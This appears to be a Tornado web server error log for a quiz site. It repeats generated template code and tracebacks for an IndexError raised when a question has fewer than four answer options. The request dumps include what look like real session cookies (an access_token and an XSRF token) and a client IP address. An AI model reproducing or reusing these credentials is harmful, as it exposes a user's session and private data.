 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505795888e4c85783e2877b6&answers=%5B0%2C2%2C3%5D&cursor=4&_xsrf=97cb8c997d4a4acd9714d8f5b0341240', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '100', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '62.31.54.23', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFMRFhDWkJhT2VHWkNNWTlEcU9RWkEzRXlKUG1HN0RHTVZxMzRUWkJ4Sjhvd2RiN2RsTlBzSVYyNDRPaDVCa1hjWkNkd0FQdnBsa2c3SEkxQlpCWDVOOW4yQmtnbzRnQVpEWkQ=|1347916980|060e0d375e9a0be13cc4eae815b04021286f2c64"; _xsrf=97cb8c997d4a4acd9714d8f5b0341240; __utma=188782963.466237686.1347916948.1347916948.1347916948.1; __utmb=188782963.5.10.1347916948; __utmc=188782963; __utmz=188782963.1347916948.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 115.52ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505795888e4c85783e2877b6&answers=%5B0%2C2%2C3%5D&cursor=4&_xsrf=97cb8c997d4a4acd9714d8f5b0341240', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '100', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '62.31.54.23', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFMRFhDWkJhT2VHWkNNWTlEcU9RWkEzRXlKUG1HN0RHTVZxMzRUWkJ4Sjhvd2RiN2RsTlBzSVYyNDRPaDVCa1hjWkNkd0FQdnBsa2c3SEkxQlpCWDVOOW4yQmtnbzRnQVpEWkQ=|1347916980|060e0d375e9a0be13cc4eae815b04021286f2c64"; _xsrf=97cb8c997d4a4acd9714d8f5b0341240; __utma=188782963.466237686.1347916948.1347916948.1347916948.1; __utmb=188782963.5.10.1347916948; __utmc=188782963; __utmz=188782963.1347916948.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 68.52ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505795888e4c85783e2877b6&answers=%5B0%5D&cursor=15&_xsrf=97cb8c997d4a4acd9714d8f5b0341240', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '62.31.54.23', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFMRFhDWkJhT2VHWkNNWTlEcU9RWkEzRXlKUG1HN0RHTVZxMzRUWkJ4Sjhvd2RiN2RsTlBzSVYyNDRPaDVCa1hjWkNkd0FQdnBsa2c3SEkxQlpCWDVOOW4yQmtnbzRnQVpEWkQ=|1347916980|060e0d375e9a0be13cc4eae815b04021286f2c64"; _xsrf=97cb8c997d4a4acd9714d8f5b0341240; __utma=188782963.466237686.1347916948.1347916948.1347916948.1; __utmb=188782963.5.10.1347916948; __utmc=188782963; __utmz=188782963.1347916948.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 97.44ms
WARNING:root:404 GET /h (127.0.0.1) 1.15ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
